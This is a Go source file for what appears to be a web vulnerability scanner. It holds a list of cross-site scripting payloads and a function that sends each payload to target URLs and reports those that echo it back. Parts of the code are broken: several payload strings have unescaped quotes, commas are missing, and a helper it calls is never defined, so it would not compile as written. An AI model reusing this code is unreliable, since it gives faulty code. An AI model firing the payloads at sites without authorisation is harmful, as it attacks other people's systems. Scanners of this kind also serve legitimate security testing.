package modules

import (
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

type XSSResult struct {
	URL         string
	Payload     string
	Vulnerable  bool
}

var xssPayloads = []string{
	"<script>alert(1)</script>",
	"\"><script>alert(1)</script>",
	"'><img src=x onerror=alert(1)>",
	"<svg/onload=alert(1)>",
        "<script\x20type="text/javascript">javascript:alert(1);</script>",
        "--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->",
        "--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->"
        "--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->"
        "`"'><img src='#\x27 onerror=javascript:alert(1)>",

}

func ScanXSS(targets []string) []XSSResult {
	var results []XSSResult
	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	for _, url := range targets {
		for _, payload := range xssPayloads {
			testURL := injectPayload(url, payload)
			resp, err := client.Get(testURL)
			if err != nil {
				continue
			}
			defer resp.Body.Close()

			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				continue
			}

			if strings.Contains(string(body), payload) {
				results = append(results, XSSResult{
					URL:        testURL,
					Payload:    payload,
					Vulnerable: true,
				})
				break
			}
		}
	}

	return results
}
